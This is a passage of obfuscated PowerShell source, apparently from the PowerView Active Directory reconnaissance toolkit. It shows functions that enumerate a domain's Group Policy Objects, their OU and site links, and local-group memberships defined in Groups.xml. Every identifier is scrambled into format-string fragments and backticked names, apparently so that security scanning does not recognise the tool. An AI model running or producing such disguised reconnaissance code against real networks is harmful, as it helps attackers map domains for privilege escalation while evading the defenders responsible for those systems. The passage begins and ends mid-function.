                            &("{1}{2}{0}" -f 't','New','-Objec') -TypeName ("{1}{0}{2}"-f 'S','P','Object') -Property @{("{0}{1}" -f'T','ype') = ${_}."LO`CA`lNaME";("{1}{0}" -f'alue','V') = ${_}."Na`Me"}
                        }
                    }
                    else {
                        ${fILTE`RS} = ${nu`Ll}
                    }

                    if (${me`mbE`RS} -isnot [System.Array]) { ${M`E`MbErs} = @(${m`e`MBErs}) }

                    ${G`R`OUpSXmL} = &("{1}{2}{0}"-f 'ect','N','ew-Obj') ("{1}{0}{2}" -f 'O','PS','bject')
                    ${G`RO`UpSXMl} | &("{0}{1}{2}" -f'Ad','d-M','ember') ("{3}{0}{2}{1}"-f'ro','rty','pe','Notep') ("{1}{0}" -f 'th','GPOPa') ${t`ArGe`TGROU`pSX`MLpAtH}
                    ${G`RO`Ups`XML} | &("{2}{0}{1}"-f'-','Member','Add') ("{2}{1}{0}"-f'ty','proper','Note') ("{0}{1}"-f 'Filt','ers') ${Fi`lT`ErS}
                    ${g`Rou`pSXMl} | &("{1}{2}{0}" -f 'Member','A','dd-') ("{0}{2}{1}"-f'Notepro','erty','p') ("{2}{1}{0}" -f'ame','upN','Gro') ${group`NA`Me}
                    ${GRo`UpS`Xml} | &("{1}{0}{2}" -f'm','Add-Me','ber') ("{1}{2}{0}"-f'roperty','Note','p') ("{0}{1}{2}"-f'G','roupSI','D') ${gro`U`psId}
                    ${grOUp`Sx`ML} | &("{1}{0}{2}"-f 'm','Add-Me','ber') ("{0}{1}{2}"-f'No','tepr','operty') ("{3}{0}{2}{1}" -f 'ou','emberOf','pM','Gr') ${n`ULl}
                    ${g`RoUp`SXml} | &("{1}{0}{2}"-f'e','Add-M','mber') ("{3}{0}{2}{1}"-f't','property','e','No') ("{0}{3}{1}{2}" -f 'G','M','embers','roup') ${mEM`B`erS}
                    ${GrOup`S`xml}."pS`OBj`ECT"."ty`PENA`mes".("{2}{0}{1}" -f'n','sert','I').Invoke(0, ("{3}{2}{0}{1}"-f'w.GroupsXM','L','owerVie','P'))
                    ${gro`Up`sxmL}
                }
            }
        }
        catch {
            &("{0}{2}{1}" -f'Wr','te-Verbose','i') ('[Get-Group'+'sXML'+']'+' '+'Err'+'or'+' '+'pa'+'r'+'sing '+"$TargetGroupsXMLPath "+': '+"$_")
        }
    }

    END {

        ${MApP`ed`paT`Hs}."KE`YS" | &("{3}{2}{4}{1}{0}" -f 'ject','b','Each','For','-O') { &("{5}{2}{1}{3}{0}{4}"-f 'nectio','-RemoteC','e','on','n','Remov') -Path ${_} }
    }
}

function geT-D`OM`AINgPO {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{0}{1}{4}{2}"-f 'hould','P','ss','PSS','roce'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{2}{5}{8}{10}{0}{9}{7}{3}{1}{6}" -f 'ar','ignm','S','Ass','P','UseDecl','ents','Than','a','sMore','redV'}, '')]
    [OutputType({"{1}{2}{0}"-f 'PO','PowerVie','w.G'})]
    [OutputType({"{0}{2}{3}{4}{1}" -f 'Power','O.Raw','Vie','w.G','P'})]
    [CmdletBinding(deFaUltpArametersetnaMe = {"{0}{1}"-f'N','one'})]
    Param(
        [Parameter(posiTIoN = 0, valUefRoMPIPeLInE = ${t`RUe}, valuEfroMpipelINEbyPRoPERTYNAmE = ${Tr`UE})]
        [Alias({"{3}{2}{0}{4}{5}{1}" -f'guishe','me','in','Dist','d','Na'}, {"{0}{1}{3}{2}"-f'Sam','Ac','untName','co'}, {"{1}{0}"-f'me','Na'})]
        [String[]]
        ${IdE`Nt`iTy},

        [Parameter(pArAMetersETnaME = "ComPut`e`R`Identi`Ty")]
        [Alias({"{2}{0}{3}{1}"-f 'p','erName','Com','ut'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${CO`MPuteRiD`e`NtiTY},

        [Parameter(paRAmetERSeTnaME = "uS`E`RidEnTi`TY")]
        [Alias({"{0}{1}{2}" -f 'U','serNam','e'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${uSe`RI`dENTitY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`OMAiN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f 'Fi','lter'})]
        [String]
        ${L`Da`pFI`lter},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${Pr`OP`ER`TIes},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f 'SPath','AD'})]
        [String]
        ${s`e`ARcHb`Ase},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{0}{1}{2}" -f'in','Con','troller','Doma'})]
        [String]
        ${sE`RveR},

        [ValidateSet({"{1}{0}" -f 'ase','B'}, {"{2}{1}{0}"-f 'l','eLeve','On'}, {"{0}{1}"-f 'Subtre','e'})]
        [String]
        ${se`ARC`hs`COPE} = ("{0}{1}" -f 'S','ubtree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${reSUlT`p`AGEs`IZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${Se`RvEr`T`imeli`MiT},

        [ValidateSet({"{0}{1}" -f'Da','cl'}, {"{1}{0}" -f 'oup','Gr'}, {"{1}{0}"-f 'one','N'}, {"{0}{1}"-f 'Owne','r'}, {"{1}{0}"-f'acl','S'})]
        [String]
        ${s`e`cURItYma`SkS},

        [Switch]
        ${TOM`BsTO`Ne},

        [Alias({"{0}{2}{1}" -f'Retur','e','nOn'})]
        [Switch]
        ${fiN`Do`Ne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`REde`NTial} =   (  &("{2}{1}{3}{0}"-f 'E','T-VARI','Ge','Abl') ("{0}{1}{2}"-f'pkF','e','zn')  -vaLUeOn  )::"eM`Pty",

        [Switch]
        ${r`Aw}
    )

    BEGIN {
        ${SEa`RchE`RaRgUmEN`Ts} = @{}
        if (${Ps`BO`UNdPArA`mETe`Rs}[("{0}{1}" -f 'Doma','in')]) { ${S`ea`RCHERaRg`UmeNtS}[("{0}{1}" -f'Domai','n')] = ${d`oma`in} }
        if (${Psbo`UN`D`pAra`MetErS}[("{1}{2}{0}"-f 's','Pr','opertie')]) { ${SEAR`cH`eRA`Rgum`entS}[("{1}{0}{2}"-f'op','Pr','erties')] = ${pROP`E`R`TIes} }
        if (${PS`BOuNdPA`RaMeT`ERS}[("{2}{1}{0}" -f'e','s','SearchBa')]) { ${Sea`RC`h`ERaR`GuMe`NTs}[("{2}{3}{0}{1}" -f 'as','e','Searc','hB')] = ${s`ea`RchbAsE} }
        if (${P`SbOu`NdpARA`M`eTERS}[("{0}{1}"-f'Se','rver')]) { ${sEaRChER`ARGu`mEn`Ts}[("{1}{2}{0}"-f 'er','Ser','v')] = ${S`e`RVER} }
        if (${PS`BOUnDpara`m`E`TerS}[("{1}{2}{0}"-f'e','Searc','hScop')]) { ${S`earc`HE`R`ArGu`meNts}[("{3}{0}{2}{1}"-f'r','pe','chSco','Sea')] = ${se`A`RcHScO`pe} }
        if (${psbO`Un`DparA`mE`Te`Rs}[("{1}{0}{3}{2}" -f'sul','Re','geSize','tPa')]) { ${s`e`ArCh`Er`ARGUMEnTS}[("{2}{3}{4}{1}{0}"-f 'ze','PageSi','Re','su','lt')] = ${Re`Su`L`T`pAgesizE} }
        if (${PSB`OuN`dpar`AmETERS}[("{2}{0}{3}{4}{1}"-f'verTim','mit','Ser','eL','i')]) { ${Sea`RChe`RARgumen`Ts}[("{0}{2}{3}{1}{4}"-f 'Se','imi','rverT','imeL','t')] = ${Se`RVeRtI`M`eLI`mit} }
        if (${pSB`ouNDP`ARAmeTe`RS}[("{3}{0}{1}{2}" -f'ityMa','s','ks','Secur')]) { ${seA`RCH`Erar`GUM`eNTS}[("{1}{3}{2}{0}" -f's','Secur','tyMask','i')] = ${SECURITy`maS`Ks} }
        if (${pSb`o`UN`DPArAmEterS}[("{2}{0}{1}" -f'bston','e','Tom')]) { ${sE`Ar`ChERA`RgUME`NTs}[("{1}{2}{0}" -f'ne','Tombs','to')] = ${t`Om`Bst`oNe} }
        if (${PsBo`U`NDparAMeT`Ers}[("{1}{0}{2}{3}"-f 'edent','Cr','i','al')]) { ${SeARc`HE`RArGuM`e`N`TS}[("{0}{2}{1}" -f 'C','al','redenti')] = ${cReD`E`Nt`IaL} }
        ${G`PoSe`ARc`HeR} = &("{3}{0}{2}{1}"-f'i','er','nSearch','Get-Doma') @SearcherArguments
    }

    PROCESS {
        if (${gP`OseaRCH`er}) {
            if (${PSb`o`UNDP`AraMETers}[("{0}{3}{2}{1}{4}" -f'C','dentit','uterI','omp','y')] -or ${psb`ouNdpa`RA`m`etE`RS}[("{1}{2}{0}" -f'tity','User','Iden')]) {
                ${gPoa`dsP`ATHS} = @()
                if (${S`EARc`HerARGu`mEntS}[("{0}{1}{2}" -f'P','ropert','ies')]) {
                    ${olDPR`OPeR`Ties} = ${SEa`RChERARguM`E`Nts}[("{0}{1}{2}" -f 'Prope','rti','es')]
                }
                ${se`AR`cHERAR`g`Ume`Nts}[("{2}{1}{0}" -f 's','opertie','Pr')] = ("{4}{0}{2}{5}{6}{3}{1}{7}" -f 'ist','tna','ingui','s','d','s','hedname,dnsho','me')
                ${TAR`gETCO`MPuTe`R`NAMe} = ${n`ULL}

                if (${psbO`Un`dPara`M`ETE`RS}[("{0}{2}{3}{1}" -f 'Compu','y','terId','entit')]) {
                    ${S`eArchE`RaRgUm`eNTs}[("{0}{1}{2}" -f'Ide','ntit','y')] = ${CO`MputERi`de`NtitY}
                    ${COm`PU`T`er} = &("{4}{0}{3}{5}{1}{2}"-f 'o','ut','er','mainCom','Get-D','p') @SearcherArguments -FindOne | &("{1}{3}{0}{2}{4}"-f 't','S','-Obje','elec','ct') -First 1
                    if(-not ${c`OMp`UtER}) {
                        &("{0}{2}{1}" -f'Write','bose','-Ver') ('['+'G'+'et-Dom'+'ai'+'nGPO] '+'Co'+'mpu'+'ter '+"'$ComputerIdentity' "+'n'+'ot '+'fo'+'und!')
                    }
                    ${ObJ`Ect`dn} = ${co`mpuTER}."disTI`N`guiShEDN`AmE"
                    ${TargETC`om`P`U`T`erNAmE} = ${cOm`P`UTER}."DnSHOStN`A`mE"
                }
                else {
                    ${seA`RChE`RaRgUm`enTs}[("{1}{0}{2}" -f'dentit','I','y')] = ${U`SERidE`N`TItY}
                    ${US`ER} = &("{1}{0}{3}{2}" -f't','Ge','omainUser','-D') @SearcherArguments -FindOne | &("{0}{1}{2}"-f'Select-','Ob','ject') -First 1
                    if(-not ${u`SeR}) {
                        &("{0}{2}{3}{1}" -f'Writ','e','e-Verbo','s') ('[Get-'+'Domai'+'nGP'+'O] '+'Us'+'er '+"'$UserIdentity' "+'not'+' '+'fou'+'n'+'d!')
                    }
                    ${oBjE`ct`DN} = ${u`SER}."D`IsTingui`s`HE`dNAmE"
                }

                ${ObJ`Ect`OUs} = @()
                ${OBj`EcT`ous} += ${oB`je`c`TDn}.("{1}{0}" -f 't','spli').Invoke(',') | &("{2}{0}{3}{1}"-f'orEach-O','ject','F','b') {
                    if(${_}.("{1}{2}{0}"-f 'ith','st','artsw').Invoke('OU=')) {
                        ${o`B`JeCTdn}.("{2}{0}{1}" -f 'tr','ing','SubS').Invoke(${OBJec`T`Dn}.("{0}{1}"-f'Inde','xOf').Invoke("$($_),"))
                    }
                }
                &("{4}{2}{3}{0}{1}" -f'r','bose','e-V','e','Writ') ('['+'Get-Do'+'ma'+'in'+'GPO] '+'obje'+'ct'+' '+'O'+'Us: '+"$ObjectOUs")

                if (${obJeC`T`OuS}) {

                    ${s`EaRC`heRa`RG`U`mENTS}.("{1}{0}" -f'emove','R').Invoke(("{2}{0}{1}"-f 'ropert','ies','P'))
                    ${InHE`RitAn`ceD`IsaBLED} = ${faL`se}
                    ForEach(${O`BJ`EcT`Ou} in ${oBjeCT`O`Us}) {
                        ${sE`ARchEr`ArGumen`Ts}[("{1}{0}{2}"-f'e','Id','ntity')] = ${oBJe`CT`OU}
                        ${gp`o`ADSPAT`hs} += &("{1}{0}{3}{2}" -f '-D','Get','nOU','omai') @SearcherArguments | &("{0}{1}{2}{3}"-f'ForEach','-O','bje','ct') {

                            if (${_}."G`PLi`Nk") {
                                ${_}."G`pLINK"."S`pLIT"('][') | &("{2}{3}{1}{0}"-f 'ect','Obj','ForE','ach-') {
                                    if (${_}.("{0}{1}{2}" -f'sta','rtswit','h').Invoke(("{0}{1}" -f'LDA','P'))) {
                                        ${PAr`Ts} = ${_}.("{0}{1}" -f'sp','lit').Invoke(';')
                                        ${gP`Odn} = ${PA`R`TS}[0]
                                        ${ENfOr`C`eD} = ${P`A`RtS}[1]

                                        if (${in`Heri`TAn`c`EDIsA`BLEd}) {

                                            if (${Enf`Or`CED} -eq 2) {
                                                ${gP`O`Dn}
                                            }
                                        }
                                        else {

                                            ${Gp`O`DN}
                                        }
                                    }
                                }
                            }

                            if (${_}."g`POpti`ONs" -eq 1) {
                                ${inHeri`TanC`edi`SAb`Led} = ${tR`UE}
                            }
                        }
                    }
                }

                if (${T`A`RGEtCOMPUt`erN`AME}) {

                    ${COM`p`UT`eRsiTe} = (&("{4}{3}{2}{5}{1}{0}" -f 'Name','e','uterSi','p','Get-NetCom','t') -ComputerName ${TArgeT`co`M`P`UTE`RName})."site`N`AmE"
                    if(${c`oMpU`TeRSi`Te} -and (${comPU`T`ersITE} -notlike ("{0}{1}" -f 'Erro','r*'))) {
                        ${Se`AR`cHERaRGumE`Nts}[("{0}{1}{2}"-f 'Ide','ntit','y')] = ${COM`Pu`TEr`SiTE}
                        ${g`p`OaDsp`AtHs} += &("{1}{0}{3}{2}" -f 'ain','Get-Dom','e','Sit') @SearcherArguments | &("{2}{4}{1}{0}{3}" -f'-Obje','ch','Fo','ct','rEa') {
                            if(${_}."g`plink") {

                                ${_}."g`plink"."SP`LIT"('][') | &("{0}{2}{1}{3}" -f 'ForEa','h-Obje','c','ct') {
                                    if (${_}.("{1}{0}{2}" -f'it','startsw','h').Invoke(("{0}{1}"-f'LDA','P'))) {
                                        ${_}.("{0}{1}" -f'sp','lit').Invoke(';')[0]
                                    }
                                }
                            }
                        }
                    }
                }

                ${OBjE`C`TdO`maiNDn} = ${o`BjeCT`dN}.("{0}{1}"-f'SubStrin','g').Invoke(${O`B`jecTdN}.("{1}{0}" -f 'ndexOf','I').Invoke('DC='))
                ${se`Ar`chERAr`G`U`Ments}.("{1}{0}"-f've','Remo').Invoke(("{1}{2}{0}" -f'y','Ide','ntit'))
                ${s`E`AR`cherar`gUMEnTs}.("{0}{2}{1}" -f 'R','move','e').Invoke(("{2}{1}{0}"-f 's','ertie','Prop'))
                ${sear`CHerargU`M`eNtS}[("{1}{2}{0}{3}" -f 'e','LDA','PFilt','r')] = "(objectclass=domain)(distinguishedname=$ObjectDomainDN)"
                ${gPoADS`p`ATHs} += &("{2}{0}{4}{1}{3}"-f '-Do','ai','Get','nObject','m') @SearcherArguments | &("{3}{2}{1}{0}" -f 'h-Object','c','orEa','F') {
                    if(${_}."Gpl`InK") {

                        ${_}."GpLi`NK"."S`plIt"('][') | &("{0}{3}{1}{2}" -f'ForE','jec','t','ach-Ob') {
                            if (${_}.("{3}{0}{2}{1}"-f'rt','th','swi','sta').Invoke(("{0}{1}" -f'L','DAP'))) {
                                ${_}.("{1}{0}"-f't','spli').Invoke(';')[0]
                            }
                        }
                    }
                }
                &("{3}{1}{2}{0}"-f 'e-Verbose','r','it','W') ('[Ge'+'t-Dom'+'ainG'+'PO] '+'GPOAds'+'P'+'aths'+':'+' '+"$GPOAdsPaths")

                if (${OLD`pR`op`eRtIeS}) { ${SE`ARCHEr`A`RGUMe`N`TS}[("{0}{2}{1}" -f 'P','perties','ro')] = ${OLDP`RoPEr`TIEs} }
                else { ${S`EARcH`ERar`gUMEnTS}.("{0}{2}{1}" -f'R','move','e').Invoke(("{1}{2}{0}" -f 's','Prope','rtie')) }
                ${Sea`RcH`Er`Argu`mEN`Ts}.("{2}{1}{0}" -f'e','emov','R').Invoke(("{0}{1}" -f'Ident','ity'))

                ${g`pO`AdSP`AthS} | &("{1}{0}{2}" -f 'er','Wh','e-Object') {${_} -and (${_} -ne '')} | &("{3}{2}{1}{0}" -f'bject','-O','ach','ForE') {

                    ${s`e`ARC`HerARguM`EnTS}[("{0}{1}{2}" -f 'Sea','rc','hBase')] = ${_}
                    ${seaRC`h`e`RargUMentS}[("{1}{0}{2}"-f 'Filte','LDAP','r')] = ("{2}{1}{3}{6}{5}{9}{0}{8}{7}{4}"-f 'upPo','j','(ob','ectCa','r)','eg','t','ne','licyContai','ory=gro')
                    &("{4}{0}{3}{2}{1}" -f 't-Do','ct','Obje','main','Ge') @SearcherArguments | &("{2}{3}{1}{0}" -f 'bject','rEach-O','F','o') {
                        if (${PsBo`Un`dPara`MeTERs}['Raw']) {
                            ${_}."P`s`obJECt"."T`Y`PENames".("{1}{0}"-f'sert','In').Invoke(0, ("{4}{2}{3}{5}{0}{1}" -f'GP','O.Raw','r','View','Powe','.'))
                        }
                        else {
                            ${_}."PSo`Bject"."TY`penaMEs".("{0}{1}{2}"-f 'I','nser','t').Invoke(0, ("{0}{3}{2}{1}"-f'Po','PO','G','werView.'))
                        }
                        ${_}
                    }
                }
            }
            else {
                ${id`E`NtITyf`ilTer} = ''
                ${F`iL`TeR} = ''
                ${iDentI`TY} | &("{3}{0}{2}{1}" -f're-O','t','bjec','Whe') {${_}} | &("{2}{0}{1}" -f 'ch-Obje','ct','ForEa') {
                    ${I`De`NtItY`In`STAncE} = ${_}.("{0}{1}"-f'Replac','e').Invoke('(', '\28').("{1}{2}{0}" -f'e','Repl','ac').Invoke(')', '\29')
                    if (${i`D`eNt`itYi`NsTANCE} -match ((("{3}{2}{4}{0}{1}" -f 'CN=','.*','//','LDAP:','WXl^')) -REplACE  'WXl',[ChAR]124)) {
                        ${Ident`IT`YFIL`T`eR} += "(distinguishedname=$IdentityInstance)"
                        if ((-not ${pS`B`ou`NdPaRA`m`eTErS}[("{1}{2}{0}" -f'in','D','oma')]) -and (-not ${pSBO`UN`D`pARA`mEt`ERs}[("{2}{0}{3}{1}" -f'a','hBase','Se','rc')])) {

                            ${Id`ENt`ITYdom`Ain} = ${IDEnTI`TY`In`STaNCe}.("{2}{1}{0}"-f'ng','i','SubStr').Invoke(${iD`E`NtitYI`N`S`TANce}.("{1}{2}{0}"-f'f','Ind','exO').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                            &("{3}{0}{1}{2}" -f 'ite-','Verbo','se','Wr') ('['+'G'+'et-Dom'+'ai'+'nGPO] '+'Ext'+'r'+'acted '+'d'+'om'+'ain '+"'$IdentityDomain' "+'fr'+'om '+"'$IdentityInstance'")
                            ${SE`ArCh`Er`ArgumeN`Ts}[("{2}{1}{0}"-f 'n','mai','Do')] = ${Id`E`Nt`i`TYDomAIN}
                            ${gPOse`A`R`cheR} = &("{0}{2}{1}{4}{3}"-f'Ge','-','t','earcher','DomainS') @SearcherArguments
                            if (-not ${GP`oSeA`RcH`eR}) {
                                &("{1}{0}{2}" -f '-Warnin','Write','g') ('[Get-Do'+'ma'+'inGP'+'O'+'] '+'U'+'nable'+' '+'to'+' '+'retrie'+'ve '+'dom'+'ai'+'n '+'se'+'a'+'r'+'cher '+'f'+'or '+"'$IdentityDomain'")
                            }
                        }
                    }
                    elseif (${IdEN`TiTYINst`An`CE} -match '{.*}') {
                        ${I`d`eNti`TyFILt`eR} += "(name=$IdentityInstance)"
                    }
                    else {
                        try {
                            ${gu`Id`ByTe`stRiNg} = (-Join (([Guid]${I`deNtitYi`NST`A`NCe}).("{1}{2}{0}"-f 'teArray','To','By').Invoke() | &("{1}{4}{0}{2}{3}"-f 'Each-','Fo','Ob','ject','r') {${_}.("{1}{0}"-f'oString','T').Invoke('X').("{0}{1}"-f'Pad','Left').Invoke(2,'0')})) -Replace ("{0}{1}" -f '(','..)'),'\$1'
                            ${ID`entitYF`Il`T`ER} += "(objectguid=$GuidByteString)"
                        }
                        catch {
                            ${IDE`NTiT`YFilT`ER} += "(displayname=$IdentityInstance)"
                        }
                    }
                }
                if (${iDeNtITY`FIL`Ter} -and (${IDEntIT`yFil`TER}.("{0}{1}"-f'Tri','m').Invoke() -ne '') ) {
                    ${F`Il`Ter} += "(|$IdentityFilter)"
                }

                if (${Ps`B`oUndPARaM`e`TERs}[("{3}{2}{0}{1}" -f 'F','ilter','DAP','L')]) {
                    &("{1}{2}{0}" -f'se','Write-Verb','o') ('['+'G'+'et-DomainGPO]'+' '+'U'+'sing '+'addit'+'io'+'nal '+'LD'+'AP '+'filt'+'er: '+"$LDAPFilter")
                    ${FiL`T`er} += "$LDAPFilter"
                }

                ${g`P`oSe`ARchER}."f`ilt`eR" = "(&(objectCategory=groupPolicyContainer)$Filter)"
                &("{2}{0}{3}{1}" -f'r','se','Write-Ve','bo') "[Get-DomainGPO] filter string: $($GPOSearcher.filter) "

                if (${PsB`o`UNDPar`AM`ete`RS}[("{1}{0}{2}"-f 'n','FindO','e')]) { ${ReSU`L`Ts} = ${g`posE`ArcHEr}.("{2}{0}{1}"-f'indOn','e','F').Invoke() }
                else { ${REsu`LtS} = ${GPo`Sea`R`cHeR}.("{0}{1}{2}" -f'Fi','ndA','ll').Invoke() }
                ${R`e`sUlTs} | &("{2}{1}{0}" -f'bject','e-O','Wher') {${_}} | &("{0}{1}{2}{3}{4}"-f'Fo','rEach','-','O','bject') {
                    if (${PsB`oun`DPAra`Me`Ters}['Raw']) {

                        ${G`Po} = ${_}
                        ${g`Po}."Ps`OBJECT"."TYPE`Nam`eS".("{1}{0}"-f 'rt','Inse').Invoke(0, ("{2}{4}{3}{1}{5}{0}" -f'aw','iew.GPO.','Pow','rV','e','R'))
                    }
                    else {
                        if (${p`sBO`Und`p`A`RaMETErS}[("{1}{0}{2}" -f 'earchB','S','ase')] -and (${s`eARCHB`AsE} -Match ("{0}{1}" -f'^GC','://'))) {
                            ${G`po} = &("{0}{4}{2}{5}{3}{1}" -f 'Con','y','rt-LDA','opert','ve','PPr') -Properties ${_}."Prope`RtI`Es"
                            try {
                                ${GP`Odn} = ${G`Po}."Dist`iNgUiS`hEDNA`ME"
                                ${gPo`DOMA`in} = ${gp`O`Dn}.("{2}{1}{0}"-f'g','ubStrin','S').Invoke(${GP`ODN}.("{0}{1}"-f 'Index','Of').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                                ${gPcfI`lEsyS`P`ATH} = "\\$GPODomain\SysVol\$GPODomain\Policies\$($GPO.cn)"
                                ${g`po} | &("{3}{1}{0}{2}" -f 'emb','dd-M','er','A') ("{3}{0}{1}{2}" -f 'op','ert','y','Notepr') ("{4}{2}{0}{1}{3}" -f 'f','il','c','esyspath','gp') ${g`PcFi`LES`ys`PatH}
                            }
                            catch {
                                &("{2}{0}{1}"-f'bos','e','Write-Ver') "[Get-DomainGPO] Error calculating gpcfilesyspath for: $($GPO.distinguishedname) "
                            }
                        }
                        else {
                            ${G`PO} = &("{1}{5}{2}{0}{3}{4}"-f'APPro','Con','ert-LD','pe','rty','v') -Properties ${_}."propERT`I`Es"
                        }
                        ${G`pO}."P`sO`BjecT"."TYp`eN`AMes".("{1}{2}{0}"-f'rt','Ins','e').Invoke(0, ("{3}{1}{0}{2}"-f'iew.','rV','GPO','Powe'))
                    }
                    ${G`PO}
                }
                if (${R`EsuL`TS}) {
                    try { ${Re`sul`TS}.("{1}{0}"-f 'ispose','d').Invoke() }
                    catch {
                        &("{4}{2}{0}{3}{1}" -f 'te-Ve','bose','i','r','Wr') ('[Get-D'+'o'+'mainGPO]'+' '+'Er'+'ror '+'dispo'+'sing'+' '+'o'+'f '+'th'+'e '+'Res'+'ul'+'ts '+'obj'+'ect'+': '+"$_")
                    }
                }
                ${Gpos`E`Arc`HeR}.("{1}{0}"-f'spose','di').Invoke()
            }
        }
    }
}

function GET`-D`o`m`AInGPOl`oCAlGr`OuP {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{1}{3}{2}" -f'PSShou','l','rocess','dP'}, '')]
    [OutputType({"{0}{2}{4}{3}{1}"-f'PowerVie','up','w.','ro','GPOG'})]
    [CmdletBinding()]
    Param(
        [Parameter(PoSitIOn = 0, VAluEFROmPiPElINE = ${T`RuE}, valUEFROmPIpeLinEByProPerTYnAmE = ${t`RuE})]
        [Alias({"{3}{4}{1}{0}{2}" -f 'ishedNa','tingu','me','D','is'}, {"{1}{2}{0}" -f'Name','Sa','mAccount'}, {"{1}{0}"-f'me','Na'})]
        [String[]]
        ${id`en`TiTY},

        [Switch]
        ${reS`Ol`VEMembeR`sT`osI`DS},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Do`m`AIN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}"-f 'Filt','r','e'})]
        [String]
        ${ld`ApfI`ltER},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f 'Path','ADS'})]
        [String]
        ${Se`ARChb`AsE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{0}{3}{2}{1}"-f 'om','ler','Control','ain','D'})]
        [String]
        ${SEr`VEr},

        [ValidateSet({"{1}{0}"-f'se','Ba'}, {"{0}{2}{1}" -f'O','eLevel','n'}, {"{1}{0}"-f'ee','Subtr'})]
        [String]
        ${SeA`Rchs`Co`Pe} = ("{1}{2}{0}" -f'e','Su','btre'),

        [ValidateRange(1, 10000)]
        [Int]
        ${r`esuL`TPAgeSIzE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${s`ErVeR`TiM`ElImIt},

        [Switch]
        ${t`o`mb`stonE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`REdE`NTIaL} =  (  &("{2}{0}{1}"-f'di','teM','ChiL') ('va'+'RiAbLe'+':PK'+'FE'+'ZN')  )."v`AlUe"::"e`MptY"
    )

    BEGIN {
        ${SEA`RC`HERa`RGuMe`NtS} = @{}
        if (${pSb`Ou`N`d`ParAMETErS}[("{1}{2}{0}" -f 'main','D','o')]) { ${s`eaRc`heRARGumE`Nts}[("{0}{1}" -f 'D','omain')] = ${Do`mAIN} }
        if (${psBoU`NdPARaME`Te`Rs}[("{2}{0}{1}" -f 'A','PFilter','LD')]) { ${S`Ea`RcHE`RaRGu`Ments}[("{2}{0}{1}"-f'APF','ilter','LD')] = ${dO`M`AiN} }
        if (${p`sBOunDP`Ar`AmE`T`eRS}[("{1}{0}{2}"-f'earchBa','S','se')]) { ${S`EArC`h`eRa`RGUMENTs}[("{2}{0}{1}" -f 'a','rchBase','Se')] = ${seaRCh`B`A`Se} }
        if (${P`sBoUNDPA`Ram`e`TE`RS}[("{1}{0}"-f 'r','Serve')]) { ${sEARCHErAR`G`UmE`NtS}[("{0}{1}" -f 'Se','rver')] = ${sE`RveR} }
        if (${PSB`OUnd`pA`R`AMeT`ers}[("{0}{3}{2}{1}"-f'S','cope','hS','earc')]) { ${SEA`R`c`hE`RaRGumenTs}[("{1}{3}{0}{2}"-f 'h','Sea','Scope','rc')] = ${Se`ARCHS`cOPE} }
        if (${PSbOU`ND`pARA`Met`ERs}[("{0}{3}{1}{2}{4}" -f 'R','su','ltPageSiz','e','e')]) { ${sear`Ch`E`R`ArGu`mEntS}[("{0}{2}{1}" -f 'Resu','Size','ltPage')] = ${rE`sul`TPA`gESiZE} }
        if (${psBoUnd`PA`R`AMEt`ERs}[("{4}{1}{0}{2}{3}"-f 'e','erv','rTimeL','imit','S')]) { ${sEARc`HE`RA`RGu`MENts}[("{1}{2}{3}{0}"-f'mit','Se','r','verTimeLi')] = ${serVeRt`imeL`I`mit} }
        if (${p`S`BoUNdp`AraMetERS}[("{1}{0}{2}"-f 'mbs','To','tone')]) { ${SeArCHe`R`Arg`U`menTs}[("{1}{0}"-f'ne','Tombsto')] = ${ToMB`sT`ONE} }
        if (${PSb`oun`DP`ARAmEters}[("{0}{2}{1}" -f'Cr','al','edenti')]) { ${sEaR`cHErARGU`M`EnTS}[("{0}{2}{1}{3}"-f 'Cr','den','e','tial')] = ${c`REdenTi`Al} }

        ${Co`N`VE`RtArgUMenTS} = @{}
        if (${p`S`BOuNDPA`RAmET`ers}[("{1}{0}"-f'main','Do')]) { ${c`oNVeRtArGU`M`eN`TS}[("{1}{0}" -f'omain','D')] = ${dO`M`AIn} }
        if (${Ps`BOuN`DP`Ar`AM`Eters}[("{1}{0}"-f'r','Serve')]) { ${c`o`Nvert`ArG`UM`entS}[("{0}{1}"-f'Se','rver')] = ${seR`VeR} }
        if (${PSBOuNd`pA`RamEt`ERs}[("{1}{2}{0}"-f 'ntial','Cr','ede')]) { ${Co`NVer`TaRgumeN`TS}[("{3}{0}{2}{1}" -f't','l','ia','Creden')] = ${cReD`E`NtIAL} }

        ${spL`ITO`PTI`on} =   (  &("{2}{0}{1}"-f'b','LE','vaRIa') ("{0}{1}" -f 'E2','P'))."v`ALUE"::"Re`MOv`EE`MpT`y`ENtRiES"
    }

    PROCESS {
        if (${PSbOun`d`Pa`RaMeteRS}[("{1}{0}"-f 'tity','Iden')]) { ${S`eARcHeraRgu`MEn`TS}[("{0}{1}{2}"-f 'Id','ent','ity')] = ${Ide`NtI`TY} }

        &("{2}{0}{1}{3}"-f'omai','nG','Get-D','PO') @SearcherArguments | &("{3}{0}{2}{4}{1}"-f 'orEac','bject','h','F','-O') {
            ${g`POdispL`AYN`AMe} = ${_}."disP`La`yNaMe"
            ${gP`oNA`me} = ${_}."N`AmE"
            ${gpoPA`TH} = ${_}."GpC`F`ilESY`sp`ATh"

